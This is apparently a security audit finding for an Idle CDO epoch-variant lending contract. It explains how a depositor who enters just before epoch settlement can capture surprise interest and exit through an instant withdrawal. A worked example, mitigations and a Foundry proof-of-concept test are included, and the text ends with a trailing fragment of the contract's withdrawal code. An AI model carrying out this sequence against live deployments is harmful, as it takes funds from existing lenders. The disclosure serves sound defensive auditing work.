### Title
Late mid-epoch deposits can sandwich discretionary `stopEpoch` interest and exit via instant withdrawal - (File: contracts/IdleCDOEpochVariant.sol)

### Summary
`depositDuringEpoch` prices new tranche shares using only the precomputed `expectedEpochInterest`, while `stopEpoch` can realize a larger manager-supplied `_interest` amount. An unprivileged, KYC-passing lender can therefore deposit immediately before epoch settlement, receive a share of interest that accrued before their deposit, request an instant withdrawal when the next APR is set to zero, and claim early in the following epoch. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
`depositDuringEpoch` mints shares as `(_amount + trancheInterest) * trancheSupply / expectedFinal`, where `expectedFinal` includes only the expected tranche interest known at deposit time. [4](#0-3) 

At epoch end, however, `prepareStopEpochWithApr0` substitutes any `_interest > 1` supplied to `stopEpoch` for `expectedEpochInterest`, and `_updateAccounting` distributes that larger realized gain to the enlarged tranche supply. [5](#0-4) [6](#0-5) 

Because `stopEpoch(0, actualInterest)` is valid when `actualInterest >= pendingWithdrawFees`, the next epoch can have `unscaledApr == 0`; if instant withdrawals are enabled and `lastEpochApr > instantWithdrawAprDelta`, the attacker’s immediate post-stop `requestWithdraw` becomes an instant request. [7](#0-6) [8](#0-7) 

The instant request burns the attacker’s tranche tokens at the post-surprise price and mints an underlying receipt to the attacker. [9](#0-8) 

### Impact Explanation
This breaks fair mint/burn accounting: a depositor who entered in the final second of an epoch receives part of a settlement gain that economically accrued to pre-existing tranche holders.

For an AA-only pool with zero fees and zero buffer, let existing AA NAV and supply both normalize to `1000`, expected AA final NAV be `1100`, and an attacker deposit `1000` one second before `epochEndDate`. The attacker’s own remaining-time interest rounds approximately to zero, so they receive `1000 * 1000 / 1100 = 909.09` shares. [10](#0-9) 

If realized interest is `200` rather than the expected `100`, final AA NAV is `2200` against `1909.09` shares, so the attacker’s instant-withdrawal receipt is about `1047.62`. The attacker extracts approximately `47.62` underlying of the surprise `100`, and the pre-existing AA holder’s value falls from `1200` to approximately `1152.38`. [11](#0-10) 

The extracted amount scales approximately as `surpriseInterest * attackerShares / finalSupply`, so larger late deposits or larger positive interest overrides increase the loss to incumbent lenders.

### Likelihood Explanation
The attack requires the standard epoch variant to have `depositDuringEpoch` and instant withdrawals enabled, a nonzero existing supply in the target tranche, and a settlement where actual interest exceeds the interest implied by the configured APR. [12](#0-11) [13](#0-12) 

Those are supported operating modes rather than privileged misbehavior: management may enable mid-epoch deposits, the borrower/manager honestly settles the epoch, and `stopEpoch` explicitly supports a realized-interest override paired with a zero next APR. [14](#0-13) [15](#0-14) 

The attacker only needs to land a deposit before the public end-of-epoch settlement transaction and then request withdrawal after `stopEpoch`; no malicious privileged role, donation, stale oracle, queue, or default is required. [16](#0-15) 

### Recommendation
Do not let a mid-epoch deposit participate in settlement gains that were not included in its entry price.

A straightforward mitigation is to calculate the minted share against the greater of expected final NAV and a settlement NAV attributable to any already determinable borrower repayment, or to disable `depositDuringEpoch` during a pre-settlement cutoff window. Alternatively, account for positive settlement outperformance as a separately streamed or epoch-tagged amount so only shares outstanding before the depositor’s entry participate in it.

For instant exits specifically, the protocol should also consider making APR0 or sharply reduced-APR withdrawals receive the pre-outperformance principal unless the requester’s tranche tokens were minted before the interest was earned. This preserves instant liquidity without allowing a newly minted share to capture previously accrued yield. [3](#0-2) 

### Proof of Concept
The following test is intended to run inside the existing `test/foundry/IdleCreditVault.t.sol` fixture, which already deploys `idleCDO`, `cdoEpoch`, `strategy`, `AAtranche`, `underlying`, `borrower`, `manager`, and `owner`.

```solidity
function testMidEpochDepositSandwichesSettlementInterest() external {
    address attacker = makeAddr("attacker");

    uint256 initialDeposit = 1_000 * ONE_SCALE;
    uint256 attackerDeposit = 1_000 * ONE_SCALE;
    uint256 surprise = 100 * ONE_SCALE;

    // Existing lender enters before the epoch.
    idleCDO.depositAA(initialDeposit);

    // Fixed-APR mode and instant withdrawals are required for the shortest exit.
    vm.prank(owner);
    cdoEpoch.setIsAYSActive(false);
    vm.prank(manager);
    cdoEpoch.setInstantWithdrawParams(1, 0, false);

    _startEpochAndCheckPrices(0);

    // The pool enables the supported mid-epoch deposit mode.
    vm.prank(owner);
    cdoEpoch.setIsDepositDuringEpochDisabled(false);

    // Attacker enters one second before settlement.
    vm.warp(cdoEpoch.epochEndDate() - 1);
    deal(defaultUnderlying, attacker, attackerDeposit);
    vm.startPrank(attacker);
    IERC20Detailed(defaultUnderlying).approve(address(cdoEpoch), attackerDeposit);
    uint256 attackerShares = cdoEpoch.depositDuringEpoch(attackerDeposit, address(AAtranche));
    vm.stopPrank();

    // Honest settlement realizes more interest than the entry-price formula used.
    uint256 expectedInterest = cdoEpoch.expectedEpochInterest();
    uint256 actualInterest = expectedInterest + surprise;
    deal(defaultUnderlying, borrower, actualInterest);
    vm.prank(borrower);
    IERC20Detailed(defaultUnderlying).approve(address(cdoEpoch), actualInterest);

    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, actualInterest);

    // Next APR is zero, so the attacker exits through the instant-request path.
    uint256 attackerUnderlyingBefore = IERC20Detailed(defaultUnderlying).balanceOf(attacker);
    vm.prank(attacker);
    uint256 receipt = cdoEpoch.requestWithdraw(attackerShares, address(AAtranche));

    assertEq(
        IdleCreditVault(address(strategy)).instantWithdrawsRequests(attacker),
        receipt,
        "request was not instant"
    );
    assertGt(receipt, attackerDeposit, "attacker did not capture pre-entry yield");

    // Start the next epoch; available strategy cash funds the instant receipt.
    vm.warp(block.timestamp + cdoEpoch.bufferPeriod() + 1);
    vm.prank(manager);
    cdoEpoch.startEpoch();

    vm.prank(attacker);
    cdoEpoch.claimInstantWithdrawRequest();

    uint256 attackerUnderlyingAfter =
        IERC20Detailed(defaultUnderlying).balanceOf(attacker);

    // For the 1000 / 1000 / surprise=100 example, profit is about 47.62.
    assertGt(
        attackerUnderlyingAfter - attackerUnderlyingBefore,
        attackerDeposit,
        "instant claim did not pay inflated receipt"
    );
}
```

The sequence succeeds because the deposit remains valid until `block.timestamp >= epochEndDate`, the attacker’s mint price is based on `expectedFinal`, and only afterward does `stopEpoch` pull and account for the larger realized `_interest`. [17](#0-16) [18](#0-17) [19](#0-18)

    );
  
    // we check if there are donated assets to the pool and transfer them to the feeReceiver if any
    _skimDonatedAssets();

    // we trigger an update accounting to check for eventual losses
    _updateAccounting();

    IdleCreditVault creditVault = IdleCreditVault(strategy);
    if (_amount == 0) {
      _amount = _userTrancheBal(msg.sender, _tranche);
    }
    _underlyings = _trancheToUnderlyings(_amount, _tranche);

    // Programmable borrower deployments do not support instant withdrawals.
    // If apr decresed wrt last epoch, request instant withdraw and burn tranche tokens directly
    // we compare unscaled aprs
    if (_isInstantWithdrawEnabled()) {
      uint256 currentApr = creditVault.unscaledApr();
      if (lastEpochApr > (currentApr + instantWithdrawAprDelta)) {
        // burn strategy tokens from cdo and mint an equal amount to msg.sender as receipt
        creditVault.requestInstantWithdraw(_underlyings, msg.sender);
        // burn tranche tokens and decrease NAV
        _withdrawOps(_amount, _underlyings, _tranche);
        return _underlyings;
      }
    }

    uint256 principal = _underlyings;
    (uint256 interest, int256 diff) = _calcInterestWithdrawRequest(_underlyings, _tranche);
    uint256 totalFees = _totalWithdrawFees(principal, interest);
    // user is requesting principal + interest minus upfront management fee and net performance fee
    _underlyings = principal + interest - totalFees;
    // add expected fees to pending withdraw fees counter
    pendingWithdrawFees += totalFees;
